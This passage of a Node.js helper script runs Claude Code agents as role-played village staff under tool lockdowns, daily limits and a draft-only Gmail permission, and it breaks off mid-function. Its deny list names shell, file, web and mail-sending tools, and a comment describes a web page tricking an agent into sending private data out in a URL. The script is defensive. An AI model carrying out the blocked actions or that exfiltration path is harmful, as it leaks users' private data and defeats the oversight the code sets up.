#!/usr/bin/env node
'use strict';
// marshall-helper.js: the village's brains. Runs on YOUR computer, only while you start it.
//
// The village page talks to this helper on your own machine (127.0.0.1). For
// each message, the helper asks Claude Code, signed in with YOUR Claude
// subscription, to answer as Marshall (the Deputy) or as one of the townspeople.
//
//  - No API key, no pay-per-use: the helper removes ANTHROPIC_API_KEY and
//    ANTHROPIC_AUTH_TOKEN before starting Claude Code, so it uses your
//    subscription login. Keep "usage credits" turned off in your Claude settings.
//  - Everyone can only talk: every Claude Code tool is switched off.
//  - Marshall hands your orders to the right townspeople, at most 3 at a time.
//    If an order needs more, Marshall tells you and waits for "Send next batch".
//  - Townspeople answer in their own personality from agents/<name>/INSTRUCTIONS.md,
//    know their own agents/<name>/NOTES.md, and add what they learn to it.
//  - Workers (horses, on Sonnet 5.5) take work only from their townsperson, who
//    checks every piece and sends it back with notes if it isn't good enough.
//  - It only listens on 127.0.0.1 (this computer) and only answers the village page.
//  - No extra packages: plain Node.js.
//
// Start it:   node helper/marshall-helper.js
// Check it:   node helper/marshall-helper.js --check

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn, execFile } = require('child_process');

const PORT = Number(process.env.MARSHALL_PORT) || 7777;
const MODEL = process.env.MARSHALL_MODEL || 'claude-opus-5-5';              // everyone runs on Opus 5.5
const ADVISOR = process.env.TOWNSFOLK_ADVISOR || 'opus';                    // townspeople's advisor (Opus 5.5 for now)
const WORKER_MODEL = process.env.WORKER_MODEL || 'claude-sonnet-5-5';       // workers run on Sonnet 5.5
const MAX_TRIES = 3;
// Gmail drafts: only these townspeople may save a draft, only with the Sheriff's yes (a button),
// and only with the create-draft tool. Sending, deleting, labelling and reading mail stay blocked.
const GMAIL_DRAFTERS = new Set(['rufus']);
const GMAIL_SERVER = process.env.GMAIL_MCP_SERVER || 'claude_ai_Gmail';    // "claude.ai Gmail" in Claude Code's /mcp
const DRAFT_TOOL = `mcp__${GMAIL_SERVER}__create_draft`;
const BLOCKED_TOOLS = ['Bash', 'Edit', 'Write', 'Read', 'Glob', 'Grep', 'NotebookEdit', 'WebFetch', 'WebSearch', 'Task', 'Agent',
  'TodoWrite', 'Skill', 'SlashCommand', 'BashOutput', 'KillShell', 'CronCreate', 'CronDelete', 'ScheduleWakeup', 'PushNotification',
  'SendMessage', 'SendUserFile', 'Artifact', 'Workflow', 'ToolSearch', 'ExitPlanMode', 'EnterWorktree', 'ExitWorktree',
  'mcp__claude_ai_Higgsfield', 'mcp__claude_ai_Claude_Docs', 'mcp__claude_ai_Google_Calendar', 'mcp__claude_ai_Google_Drive',
  ...['send_message', 'reply', 'forward', 'update_draft', 'delete_draft', 'list_drafts', 'get_draft', 'get_thread', 'get_message',
    'search_threads', 'list_labels', 'label_thread', 'unlabel_thread', 'label_message', 'unlabel_message', 'update_message_labels',
    'apply_sensitive_thread_label', 'apply_sensitive_message_label', 'trash_thread', 'trash_message', 'untrash_thread', 'untrash_message',
    'mark_thread_spam', 'mark_message_spam', 'unmark_thread_spam', 'unmark_message_spam', 'create_label', 'update_label', 'delete_label',
    'download_gmail_attachment'].map(t => `mcp__${GMAIL_SERVER}__${t}`)];             // a worker gets at most 2 send-backs; after that the townsperson fixes it
const CLAUDE = process.env.MARSHALL_CLAUDE_BIN || 'claude';
const TIMEOUT_MS = 420000;       // a run may take up to 7 minutes (building a website takes a while)
const MAX_MESSAGE_CHARS = 2000;
const BATCH = 3;                 // Marshall hands out at most 3 tasks at a time
const MAX_PARALLEL = 2;          // at most 2 Claude Code runs at once (gentle on your Pro limits)

const HERE = __dirname;
const HOME = path.join(HERE, 'marshall-home');               // private working folder (memory, logs)
const AGENTS = path.join(HERE, '..', 'agents');               // the townspeople's folders
const MARSHALL_PERSONA = path.join(HERE, 'marshall-persona.md');
const SESSIONS_FILE = path.join(HOME, 'sessions.json');       // conversation ids, so everyone remembers
const ORDERS_FILE = path.join(HOME, 'orders.json');           // every task Marshall handed out
const LOG_FILE = path.join(HOME, 'village-log.jsonl');        // the chat log you see on the left
const TODOS_FILE = path.join(HOME, 'todos.json');             // the Sheriff's to-do list
const RUNS_FILE = path.join(HOME, 'runs-log.csv');            // one line per Claude Code run, for the build log
const ROOM = path.join(HOME, 'room');                         // empty folder Claude Code runs in
const HIRING_FILE = path.join(HOME, 'hiring.json');           // the candidate waiting at the town hall, and past interviews
const NOTICES_FILE = path.join(HOME, 'notices.json');         // things Marshall needs the Sheriff for
const SETTINGS_FILE = path.join(HOME, 'settings.json');       // e.g. Mac notifications on/off
const MAX_WORKERS = 3;
const WORKSHOP = path.join(HERE, '..', 'workshop');           // things the village makes: websites, documents, spreadsheets
const WORKSHOP_FILE = path.join(HOME, 'workshop.json');       // what's in the workshop, who made it, and where it's published           // workers per townsperson (what fits in a yard)
fs.mkdirSync(ROOM, { recursive: true });

const readJSON = (file, fallback) => { try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return fallback; } };
const writeJSON = (file, value) => fs.writeFileSync(file, JSON.stringify(value, null, 2));
const today = () => new Date().toLocaleDateString('en-CA');

// ---------- the townspeople ----------
function townspeople() {
  const list = [];
  for (const key of fs.existsSync(AGENTS) ? fs.readdirSync(AGENTS).sort() : []) {
    const file = path.join(AGENTS, key, 'INSTRUCTIONS.md');
    if (!/^[a-z]{2,20}$/.test(key) || !fs.existsSync(file)) continue;
    const head = fs.readFileSync(file, 'utf8').split('\n')[0];              // "# Name: Area"
    const m = head.match(/^#\s*(.+?):\s*(.+)$/);
    // 'Clementine "Clem" Pike' -> 'Clem Pike' (the name used in the village)
    const full = m ? m[1].trim() : key, nick = full.match(/"([^"]+)"/);
    list.push({ key, name: nick ? `${nick[1]} ${full.split(/\s+/).pop()}` : full, area: m ? m[2].trim() : '' });
  }
  return list;
}
// the workers: agents/<townsperson>/workers/<key>/INSTRUCTIONS.md ("# Biscuit: Worker for Clem Pike (Prospecting)")
function workers() {
  const list = [];
  for (const tp of townspeople()) {
    const dir = path.join(AGENTS, tp.key, 'workers');
    for (const key of fs.existsSync(dir) ? fs.readdirSync(dir).sort() : []) {
      const file = path.join(dir, key, 'INSTRUCTIONS.md');
      if (!/^[a-z]{2,20}$/.test(key) || !fs.existsSync(file)) continue;
      const m = fs.readFileSync(file, 'utf8').split('\n')[0].match(/^#\s*(.+?):/);
      list.push({ key, name: m ? m[1].trim() : key, owner: tp.key, dir: path.join(dir, key) });
    }
  }
  return list;
}
const workerInfo = (key) => workers().find(w => w.key === key) || null;
const workersOf = (townsperson) => workers().filter(w => w.owner === townsperson);
// which worker gets a job: the one named in `text`, else one who's free, else the first
function pickWorker(townsperson, text) {
  const ws = workersOf(townsperson);
  if (!ws.length) return null;
  const named = ws.find(w => new RegExp('\\b' + w.name + '\\b', 'i').test(text || ''));
  return named || ws.find(w => !working.has(w.key)) || ws[0];
}
const shortName = (key) => { const p = townspeople().find(t => t.key === key) || workerInfo(key); return p ? p.name : key; };

// ---------- running Claude Code (your subscription, no tools) ----------
// Only your Claude subscription login: remove every way Claude Code could bill
// somewhere else (API keys, other providers, another server address).
function subscriptionEnv(withConnectors) {
  const env = { ...process.env };
  for (const k of Object.keys(env)) {
    if (/^ANTHROPIC_/.test(k) || /^CLAUDE_CODE_USE_/.test(k) || /^AWS_BEARER_TOKEN_BEDROCK$/.test(k)) delete env[k];
  }
  if (!withConnectors) env.ENABLE_CLAUDEAI_MCP_SERVERS = 'false';   // no claude.ai connectors (Gmail, Higgsfield...) at all
  return env;
}
function runClaude(args, withConnectors) {
  return new Promise((resolve) => {
    let out = '', err = '', done = false, child;
    try {
      child = spawn(CLAUDE, args, { cwd: ROOM, env: subscriptionEnv(withConnectors), shell: false, windowsHide: true });
    } catch (e) {
      return resolve({ code: -1, out: '', err: String(e && e.message || e), spawnError: true });
    }
    const timer = setTimeout(() => { if (!done) child.kill('SIGINT'); }, TIMEOUT_MS);
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { err += d; });
    child.on('error', (e) => { done = true; clearTimeout(timer); resolve({ code: -1, out, err: String(e.message || e), spawnError: true }); });
    child.on('close', (code) => { if (done) return; done = true; clearTimeout(timer); resolve({ code, out, err }); });
    child.stdin.end();
  });
}

// at most MAX_PARALLEL runs at once; the rest wait their turn
let running = 0;
const queue = [];
function limited(fn) {
  return new Promise((resolve, reject) => {
    const go = () => { running++; fn().then(resolve, reject).finally(() => { running--; const next = queue.shift(); if (next) next(); }); };
    if (running < MAX_PARALLEL) go(); else queue.push(go);
  });
}

let noAdvisor = false;
let noSnapshotFlag = false;          // set if this Claude Code doesn't support the advisor option
let systemPromptFlag = 'replace';

// One message to one agent. Returns the plain text they answered.
// ---------- the tool matrix (agreed with the Sheriff; Phase 1) ----------
// Who may use what. Workers get no tools. "library" and "logs" are things the helper adds to
// the instructions (no tool). A run that loads private data (the library, the calendar, town
// facts) never gets to open arbitrary web pages: a bad page could trick it into sending that
// data away in a web address. Legal may open official .gov pages only.
const CAL = (t) => `mcp__claude_ai_Google_Calendar__${t}`;
const CALENDAR_READ = { [CAL('list_events')]: { calendarIdIn: ['primary'] }, [CAL('get_event')]: { calendarIdIn: ['primary'] },
  [CAL('search_events')]: {}, [CAL('suggest_time')]: { maxAttendees: 1 } };
const OFFICIAL_SITES = (process.env.VILLAGE_OFFICIAL_SITES || '.gov').split(',').map(x => x.trim()).filter(Boolean);
const MATRIX = {
  marshall: { calendar: true },
  clem:     { search: true },                                // Prospecting: web search (no page-opening, so he can know the town facts)
  augustus: { library: true, calendar: true },              // Sales
  jo:       { library: true },                              // Delivery
  ezra:     { search: true, library: true },                // Product (no page-opening: the library is private)
  hattie:   { library: true, calendar: true },              // Client Success
  rufus:    { library: true },                              // Marketing & Content (+ Gmail drafts with the button)
  winona:   { search: true, calendar: true },               // Partnerships (no page-opening: the calendar is private)
  mortimer: {},                                             // Finance & Admin (Phase 2)
  beatrice: { search: true, fetch: 'official', library: true },  // Legal & Compliance
  silas:    { logs: true },                                 // Operations & Analytics
};
const toolsFor = (agent) => {
  const m = MATRIX[agent] || {}, policy = {};
  if (m.search) policy.WebSearch = {};
  if (m.fetch === 'any') policy.WebFetch = {};
  if (m.fetch === 'official') policy.WebFetch = { hostSuffix: OFFICIAL_SITES };
  if (m.calendar) Object.assign(policy, CALENDAR_READ);
  return policy;
};
const loadsPrivate = (agent) => { const m = MATRIX[agent] || {}; return !!(m.library || m.calendar) || m.fetch !== 'any'; };
function toolsNote(agent) {
  const m = MATRIX[agent] || {}, can = [];
  if (m.search) can.push('search the web (cite the source address for every fact you use)');
  if (m.fetch === 'any') can.push('open web pages to read them (never log in or fill in forms)');
  if (m.fetch === 'official') can.push(`open official government pages (${OFFICIAL_SITES.join(', ')}) to read them`);
  if (m.calendar) can.push("read the Sheriff's primary calendar (events and free times); never change it");
  if (agent === 'rufus') can.push('save a finished email or letter as a Gmail draft, but only when the Sheriff presses the button');
  return can.length ? `\n\n## Tools you can use\nYou can ${can.join('; ')}. Nothing else: you can't send, post, buy, book or change anything.` : '';
}

// The Village Library: reference files the Sheriff puts in the library/ folder (offers, brand voice,
// templates...). Added to the instructions of the townspeople the matrix gives it to.
const LIBRARY = path.join(HERE, '..', 'library');
function libraryText() {
  if (!fs.existsSync(LIBRARY)) return '';
  let out = '', total = 0;
  for (const name of fs.readdirSync(LIBRARY).sort()) {
    if (!/\.(md|txt|csv)$/i.test(name) || /^readme\.md$/i.test(name)) continue;
    let t = ''; try { t = fs.readFileSync(path.join(LIBRARY, name), 'utf8'); } catch { continue; }
    t = t.slice(0, 40000 - total); total += t.length;
    out += `\n### ${name}\n${t}\n`;
    if (total >= 40000) { out += '\n(The rest of the library was too long to include.)\n'; break; }
  }
  return out ? `\n\n## The Village Library (reference from the Sheriff)\n${out}` : '';
}
// Operations' view: what's been happening (from the helper's own logs; no tool)
function logsText() {
  let runs = '';
  try {
    const lines = fs.readFileSync(RUNS_FILE, 'utf8').trim().split('\n').slice(1).filter(l => l.startsWith(today()));
    const by = {}; for (const l of lines) { const a = l.split(',')[1]; by[a] = (by[a] || 0) + 1; }
    runs = `Claude runs today: ${lines.length}${lines.length ? ' (' + Object.entries(by).map(([a, n]) => `${a === 'marshall' ? 'Marshall' : shortName(a)} ${n}`).join(', ') + ')' : ''}.`;
  } catch { runs = 'No runs logged yet today.'; }
  const recent = log.slice(-30).map(e => `- ${e.time.slice(11, 16)} ${e.from} → ${e.to}: ${clip(String(e.text), 160)}`).join('\n');
  const todos = loadTodos();
  return `\n\n## Village logs (from the helper)\n${runs}\nTo-dos: ${todos.filter(t => t.status !== 'done' && t.status !== 'declined').length} open, ${todos.filter(t => t.status === 'done').length} done.\nRecent activity:\n${recent || '(none yet)'}`;
}

// ---------- the lockdown on every Claude Code run ----------
// - No built-in tools at all (--tools ""): no files, commands, web, scheduling or sub-agents.
// - None of your own Claude Code settings, plugins, hooks or skills (--setting-sources project,
//   in an empty folder), so nothing you allowed for yourself carries over to the village.
// - No connectors (MCP servers) except for Rufus saving a Gmail draft, which gets only the
//   create-draft tool.
// - The tool gate (tool-gate.js) checks every tool call and blocks anything not allowed.
const GATE = path.join(HERE, 'tool-gate.js');
const ATTEMPTS_FILE = path.join(HOME, 'tool-attempts.jsonl');
const shellQuote = (t) => `'${String(t).replace(/'/g, `'\\''`)}'`;
const BUILT_IN = new Set(['WebSearch', 'WebFetch']);      // the only built-in tools any village run can ever get
const asPolicy = (tools) => Array.isArray(tools) ? Object.fromEntries(tools.map(t => [t, {}])) : (tools || {});
const usesConnectors = (tools) => Object.keys(asPolicy(tools)).some(t => t.startsWith('mcp__'));
function lockdown(agent, tools) {
  const policy = asPolicy(tools);
  for (const t of Object.keys(policy)) if (!t.startsWith('mcp__') && !BUILT_IN.has(t)) delete policy[t];
  const allowed = Object.keys(policy);
  const gate = [process.execPath, GATE, agent, ATTEMPTS_FILE, JSON.stringify(policy)].map(shellQuote).join(' ');
  const settings = { hooks: { PreToolUse: [{ matcher: '*', hooks: [{ type: 'command', command: gate }] }] } };
  const builtIns = allowed.filter(t => BUILT_IN.has(t));
  return ['--tools', builtIns.join(','), '--setting-sources', 'project', '--disable-slash-commands', '--settings', JSON.stringify(settings),
    ...(allowed.length ? ['--allowedTools', allowed.join(',')] : []),
    ...(usesConnectors(policy) ? [] : ['--strict-mcp-config']),
    '--disallowedTools', BLOCKED_TOOLS.filter(t => !allowed.includes(t)).join(',')];
}
// tell the Sheriff if an agent tried to use something it isn't allowed to (the gate blocked it)
let attemptsSeen = fs.existsSync(ATTEMPTS_FILE) ? fs.statSync(ATTEMPTS_FILE).size : 0;
function checkToolAttempts() {
  if (!fs.existsSync(ATTEMPTS_FILE)) return;
  const size = fs.statSync(ATTEMPTS_FILE).size;
  if (size <= attemptsSeen) return;
  const fd = fs.openSync(ATTEMPTS_FILE, 'r'), buf = Buffer.alloc(size - attemptsSeen);
  fs.readSync(fd, buf, 0, buf.length, attemptsSeen); fs.closeSync(fd);
  attemptsSeen = size;
  for (const line of buf.toString('utf8').split('\n')) {
    let a; try { a = JSON.parse(line); } catch { continue; }
    if (a.allowed) continue;
    const who = a.who === 'marshall' ? 'Marshall' : shortName(a.who);
    addLog('Village safety', 'Sheriff', `${who} tried to use ${a.tool} and was blocked.`, 'problem');
    addNotice('problem', `${who} tried to use a tool they aren't allowed (${a.tool}). It was blocked; nothing happened.`, { log: true });
  }
}
// a daily safety limit on Claude runs, so nothing can run away with your allowance
const DAILY_RUN_LIMIT = Number(process.env.VILLAGE_DAILY_RUN_LIMIT) || 300;
const RUNS_TODAY_FILE = path.join(HOME, 'runs-today.json');
function underDailyLimit() {
  const r = readJSON(RUNS_TODAY_FILE, {});
  return r.date !== today() || (r.count || 0) < DAILY_RUN_LIMIT;
}
function countRun() {
  const r = readJSON(RUNS_TODAY_FILE, {});
  const next = r.date === today() ? { date: r.date, count: (r.count || 0) + 1 } : { date: today(), count: 1 };
  writeJSON(RUNS_TODAY_FILE, next);
  if (next.count === DAILY_RUN_LIMIT) addNotice('problem', `The village reached today's safety limit of ${DAILY_RUN_LIMIT} Claude runs. Everyone rests until tomorrow.`, { log: true });
}

// opts.allowTools: the only tools this run may use (default: none at all). Such runs start a
// fresh conversation each time. opts.result receives Claude Code's full answer.
async function ask(agent, systemPrompt, message, opts = {}) {
  const isWorker = !!workerInfo(agent);
  const tools = opts.allowTools && Object.keys(asPolicy(opts.allowTools)).length ? opts.allowTools : null;
  const fresh = !!opts.fresh;                                        // a one-off run (e.g. saving a Gmail draft): no memory
  return limited(async () => {
    const sessions = fresh ? {} : readJSON(SESSIONS_FILE, {});
    const version = crypto.createHash('sha1').update(systemPrompt.split('## Your notes')[0]).digest('hex').slice(0, 12);
    let s = sessions[agent] || {};
    if (s.version !== version) s = { version };                 // instructions changed: fresh conversation

    const promptFile = path.join(HOME, `prompt-${agent}${tools ? '-tools' : ''}.md`);
    fs.writeFileSync(promptFile, systemPrompt);
    const build = () => {
      const args = ['-p', message, '--model', opts.model || (isWorker ? WORKER_MODEL : MODEL), '--output-format', 'json',
        ...lockdown(agent, tools),
        '--permission-mode', 'dontAsk', '--max-turns', tools ? '10' : '2',
        // send the current notes, town facts and approved work with every message (Claude Code otherwise
        // records the first copy of the instructions and keeps reusing it in later messages)
        ...(noSnapshotFlag ? [] : ['--system-prompt-snapshot', 'off'])];
      args.push(...(systemPromptFlag === 'append' ? ['--append-system-prompt-file', promptFile] : ['--system-prompt', systemPrompt]));
      if (agent !== 'marshall' && !isWorker && !opts.model && !noAdvisor && ADVISOR !== 'none') args.push('--advisor', ADVISOR);
      if (s.sessionId) args.push('--resume', s.sessionId);
      return args;
    };
    const started = Date.now();
    if (!underDailyLimit()) throw new Error(`The village has used its ${DAILY_RUN_LIMIT} Claude runs for today (a safety limit). Everyone rests until tomorrow.`);
    let run = await runClaude(build(), usesConnectors(tools));
    if (run.code !== 0 && /system-prompt-snapshot/i.test(run.out + run.err) && !noSnapshotFlag) {
      noSnapshotFlag = true;            // an older Claude Code: it doesn't record a first copy either
      console.log('  note: this Claude Code has no --system-prompt-snapshot option (older version); continuing without it.');
      run = await runClaude(build(), usesConnectors(tools));
    }
    if (run.code !== 0 && /unknown option|unknown argument/i.test(run.out + run.err)) {
      throw new Error(`Your Claude Code is too old for the village's safety settings, so nothing ran. Update it (run: claude update), then try again. (${(run.err || run.out).trim().slice(0, 160)})`);
    }
    const said = run.out + run.err;
    if (run.code !== 0 && /advisor/i.test(said) && !noAdvisor) {
      noAdvisor = true;
      console.log('  note: this Claude Code does not take the advisor option here; townspeople will run without it.');
      run = await runClaude(build(), usesConnectors(tools));
    }
    if (run.code !== 0 && /system-prompt/i.test(run.out + run.err) && systemPromptFlag !== 'append') { systemPromptFlag = 'append'; run = await runClaude(build(), usesConnectors(tools)); }
    if (s.sessionId && run.code !== 0 && /session|resume/i.test(run.out + run.err)) { delete s.sessionId; run = await runClaude(build(), usesConnectors(tools)); }
    const seconds = ((Date.now() - started) / 1000).toFixed(1);
    countRun();
    checkToolAttempts();

    if (run.spawnError) throw new Error(`Couldn't start Claude Code ("${CLAUDE}"). Is it installed and on your PATH? (${run.err})`);
    let obj;
    try { obj = JSON.parse(run.out); } catch { throw new Error(`Claude Code didn't answer as expected. ${(run.err || run.out).trim().slice(0, 300)}`); }
    if (opts.result) opts.result(obj);
    if (obj.session_id && !fresh) s.sessionId = obj.session_id;
    if (fresh) return typeof obj.result === 'string' ? obj.result : '';
    const latest = readJSON(SESSIONS_FILE, {});                // re-read: someone else's run may have finished meanwhile
    latest[agent] = s;
    writeJSON(SESSIONS_FILE, latest);

    const u = obj.usage || {};
    if (!fs.existsSync(RUNS_FILE)) fs.writeFileSync(RUNS_FILE, 'time,agent,seconds,input_tokens,output_tokens,cache_read_tokens,estimated_api_value_usd\n');
    fs.appendFileSync(RUNS_FILE, [new Date().toISOString(), agent, seconds, u.input_tokens || 0, u.output_tokens || 0, u.cache_read_input_tokens || 0, obj.total_cost_usd || 0].join(',') + '\n');

    const models = Object.keys(obj.modelUsage || {});
    if (models.length) console.log(`  (${agent === 'marshall' ? 'Marshall' : shortName(agent)} ran on ${models.join(' + ')}, ${seconds}s)`);
    const text = typeof obj.result === 'string' ? obj.result : '';
    if (obj.is_error || !text.trim()) throw new Error(`${agent === 'marshall' ? 'Marshall' : shortName(agent)} couldn't answer: ${(text || run.err || 'no reply').trim().slice(0, 300)}`);
    return text;
  });
}

// ---------- reading answers ----------
const grab = (text, key) => { const m = text.match(new RegExp('^\\s*\\**' + key + '\\**\\s*:\\s*(.*)$', 'im')); return m ? m[1].trim() : ''; };
const isNone = (v) => !v || /^(none|n\/a|-|nothing)\.?$/i.test(v.trim());
function tidy(t, max) {
  t = String(t).replace(/[*_`#>]+/g, '').replace(/\s+/g, ' ').trim();
  if (t.length <= max) return t;
  const cut = t.slice(0, max);
  const end = Math.max(cut.lastIndexOf('. '), cut.lastIndexOf('! '), cut.lastIndexOf('? '));
  return end > 15 ? cut.slice(0, end + 1) : cut.replace(/\s+\S*$/, '') + '…';
}
function sayLine(text, max) {
  let say = grab(text, 'SAY');
  if (!say) say = text.split('\n').filter(l => !new RegExp('^\\s*\\**\\s*(' + FIELDS + ')\\b', 'i').test(l)).join(' ');
  return tidy(say, max);
}

// a section that may run over several lines, up to the next answer line (keeps line breaks)
const FIELDS = 'SAY|NOTE|DONE|TASK|WORKER|INSTRUCTIONS|WORK|VERDICT|CHECK|FIXED|HELP|HIRE|DRAFT|LINK|NAME|PERSONALITY|QUIRK|STRENGTHS|WHY|QUESTION|BLOCKED|PROPOSE|ASK|PASS|START|ANSWER';
function block(text, key) {
  const re = new RegExp('^\\s*\\**\\s*' + key + '\\s*\\**\\s*:[ \\t]*([\\s\\S]*?)(?=^\\s*\\**\\s*(?:' + FIELDS + ')\\b[^\\n:]{0,20}\\**\\s*:|(?![\\s\\S]))', 'im');
  const m = text.match(re);
  return m ? m[1].replace(/\*\*/g, '').replace(/\n{3,}/g, '\n\n').trim() : '';
}
// ---------- the Workshop: real files, made by writing them in the answer ----------
// Agents have no tools, so they can't create files themselves. Instead they write each
// file in their answer between FILE: and END FILE, and the helper checks and saves them
// in workshop/<id>/. Only simple web and text files, only flat names, size-limited.
const MAKE_FILES = `If the task asks you to MAKE something real, the work is files. Write each whole file like this:
FILE: index.html
(the complete file)
END FILE
Allowed: .html .css .js .svg .md .txt .csv .json, simple names with no folders. Pick the right kind:
- A website: index.html (styles inside it or in style.css).
- A document, report, letter, one-pager or PDF: document.html, a single page laid out for printing on Letter paper (@page and print styles, no website navigation). The Sheriff saves it as a PDF from the General Store. Never make a website when a document or PDF was asked for.
- A spreadsheet, table or list of data: a .csv file (opens in Excel, Numbers or Google Sheets).
- Notes or plain text: a .md file.
Keep it self-contained: no outside scripts or trackers (web fonts from fonts.googleapis.com are fine). Use [placeholders] for facts you don't know. For anything people will look at (websites, documents), follow the design guide below.`;
// Anthropic's frontend-design skill (agents/skills/frontend-design), added whenever something visual is made
const DESIGN_SKILL = (() => { try { return fs.readFileSync(path.join(AGENTS, 'skills', 'frontend-design', 'SKILL.md'), 'utf8').replace(/^---[\s\S]*?---\s*/, ''); } catch { return ''; } })();
const VISUAL_WORK = /\b(website|web ?site|web ?page|landing|page|site|pdf|document|report|one-pager|flyer|brochure|newsletter|deck|design|brand|letterhead|invoice|menu|poster)\b/i;
const designGuide = (text) => DESIGN_SKILL && VISUAL_WORK.test(text) ? `\n\n## Design guide (Anthropic's frontend-design skill)\nYou can't take screenshots; critique your work by reading it.\n${DESIGN_SKILL}` : '';
const FILE_TYPES = { html: 'text/html; charset=utf-8', css: 'text/css; charset=utf-8', js: 'text/javascript; charset=utf-8', svg: 'image/svg+xml',
  md: 'text/plain; charset=utf-8', txt: 'text/plain; charset=utf-8', csv: 'text/plain; charset=utf-8', json: 'application/json; charset=utf-8' };
const safeFileName = (n) => /^[A-Za-z0-9][A-Za-z0-9._-]{0,60}\.([a-z]{2,4})$/.test(n) && !n.includes('..') && FILE_TYPES[n.split('.').pop()];
function takeFiles(answer) {
  const files = [];
  const rest = String(answer || '').replace(/^\s*\**\s*FILE\s*\**\s*:\s*(\S+)\s*\n([\s\S]*?)\n\s*\**\s*END FILE\s*\**\s*$/gim, (all, name, body) => {
    name = name.replace(/[`*]/g, '');
    body = body.replace(/^```[a-z]*\n/i, '').replace(/\n```\s*$/, '');
    if (safeFileName(name) && files.length < 20 && body.length <= 300000 && !files.some(f => f.name === name)) files.push({ name, body });
    return `[file: ${name}]`;
  });
  return { files, rest };
}
const filesText = (files, max) => files.map(f => `FILE: ${f.name}\n${f.body.length > max ? f.body.slice(0, max) + '\n[... cut for length]' : f.body}\nEND FILE`).join('\n\n');
function workshopKind(names) {
  if (names.includes('index.html')) return 'website';
  if (names.some(n => n.endsWith('.html'))) return 'document';
  if (names.some(n => n.endsWith('.csv'))) return 'spreadsheet';
  return 'other';
}
// a .zip of a workshop item (stored, not compressed: plain Node.js, no packages)
const CRC_TABLE = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
const crc32 = (buf) => { let c = 0xffffffff; for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
function makeZip(entries) {      // entries: [{ name, data: Buffer }]
  const parts = [], central = [];
  let offset = 0;
  for (const { name, data } of entries) {
    const nm = Buffer.from(name), crc = crc32(data);
    const local = Buffer.alloc(30); local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(nm.length, 26);
    const cen = Buffer.alloc(46); cen.writeUInt32LE(0x02014b50, 0); cen.writeUInt16LE(20, 4); cen.writeUInt16LE(20, 6); cen.writeUInt32LE(crc, 16);
    cen.writeUInt32LE(data.length, 20); cen.writeUInt32LE(data.length, 24); cen.writeUInt16LE(nm.length, 28); cen.writeUInt32LE(offset, 42);
    parts.push(local, nm, data); central.push(cen, nm);
    offset += 30 + nm.length + data.length;
  }
  const cdir = Buffer.concat(central), end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdir.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, cdir, end]);
}
function saveToWorkshop(t, r) {
  const id = crypto.randomBytes(5).toString('hex');
  const dir = path.join(WORKSHOP, id);
  fs.mkdirSync(dir, { recursive: true });
  for (const f of r.files) fs.writeFileSync(path.join(dir, f.name), f.body);
  const all = readJSON(WORKSHOP_FILE, []);
  const prev = t.revise ? all.find(x => x.id === t.revise.id) : null;
  const slug = prev ? prev.slug : (t.task.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 30) || 'site') + '-' + id.slice(0, 4);
  const item = { id, slug, task: prev ? prev.task : t.task, order: t.order, agent: t.agent, doneBy: r.doneBy, checkedBy: r.checkedBy || null, files: r.files.map(f => f.name),
    website: r.files.some(f => f.name === 'index.html'), kind: workshopKind(r.files.map(f => f.name)), created: new Date().toISOString(),
    published: null, review: { status: 'waiting' }, version: prev ? (prev.version || 1) + 1 : 1, revisionOf: prev ? prev.id : null,
    feedbackAnswered: t.revise ? t.revise.feedback : null };
  if (prev) { prev.supersededBy = id; if (prev.published) item.publishedBefore = prev.published; }
  all.push(item); writeJSON(WORKSHOP_FILE, all);
  return item;
}

const clip = (t, max) => (t.length <= max ? t : t.slice(0, max).replace(/\s+\S*$/, '') + ' …');
function noteFrom(agent, answer) {
  const note = grab(answer, 'NOTE');
  if (!isNone(note)) addNote(agent, "What I've learned", tidy(note, 300));
  passesFrom(agent, answer);
  return !isNone(note);
}
// PASS key: … hands a colleague something they need; it lands in their notes under "From colleagues"
function passesFrom(agent, answer) {
  const keys = townspeople().map(t => t.key);
  let n = 0;
  for (const m of String(answer).matchAll(/^\s*\**\s*PASS\s+([a-z]+)\s*\**\s*:\s*([\s\S]*?)(?=^\s*\**\s*(?:SAY|NOTE|DONE|TASK|WORKER|INSTRUCTIONS|WORK|QUESTION|BLOCKED|HELP|PASS|VERDICT|CHECK|FIXED|FILE)\b|(?![\s\S]))/gim)) {
    const to = m[1].toLowerCase(), what = clip(m[2].replace(/\s+/g, ' ').trim(), 1500);
    if (!keys.includes(to) || to === agent || !what || n >= 3) continue;
    n++;
    const from = agent === 'marshall' ? 'Marshall' : shortName(agent);
    addNote(to, 'From colleagues', `${from}: ${what}`);
    addLog(from, shortName(to), `Passed to you: ${what}`, 'task');
  }
}

// ---------- the chat log (what you see on the left) ----------
let log = [];
for (const line of (fs.existsSync(LOG_FILE) ? fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').slice(-300) : [])) { try { log.push(JSON.parse(line)); } catch { /* skip */ } }
let nextId = log.length ? log[log.length - 1].id + 1 : 1;
function addLog(from, to, text, kind, extra) {
  const e = { id: nextId++, time: new Date().toISOString(), from, to, text, kind: kind || 'chat', ...(extra || {}) };
  log.push(e); if (log.length > 300) log = log.slice(-300);
  fs.appendFileSync(LOG_FILE, JSON.stringify(e) + '\n');
  console.log(`${from} → ${to}: ${text}`);
  return e;
}

// ---------- notes ----------
// Everyone's notes files are their memory. They live only on your computer (they're
// not saved to GitHub), so anyone who doesn't have one yet gets a fresh one here.
function ensureNotes() {
  const fresh = (title, about, sections) => `# ${title}'s notes\n\n${about} I read this before every task and add to it after.\nKeep each entry short, dated (YYYY-MM-DD) and newest first.\n` +
